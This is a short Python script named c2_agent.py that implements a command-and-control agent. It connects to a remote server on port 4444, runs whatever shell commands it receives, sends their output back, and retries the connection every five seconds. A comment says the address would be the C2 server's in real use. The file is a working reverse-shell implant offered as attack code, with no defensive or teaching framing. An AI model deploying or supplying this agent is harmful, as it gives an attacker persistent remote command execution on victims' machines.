# c2_agent.py
import socket
import subprocess
import os
import time

def run_agent(server_ip='127.0.0.1', server_port=4444):
    while True:
        try:
            # Create socket and connect to server
            agent = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            agent.connect((server_ip, server_port))
            
            while True:
                # Receive command
                command = agent.recv(1024).decode()
                
                if command.lower() == 'exit':
                    break
                
                # Execute command
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                
                # Send output back with a delimiter to signify end of output
                if not stdout_value:
                    agent.send(b"No output returned.END_OF_OUTPUT")
                else:
                    agent.send(stdout_value + b"END_OF_OUTPUT")
            
            agent.close()
        except socket.error:
            # Retry connection every 5 seconds if server is down
            time.sleep(5)
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    # In a real scenario, server_ip would be the C2 server's IP
    run_agent()
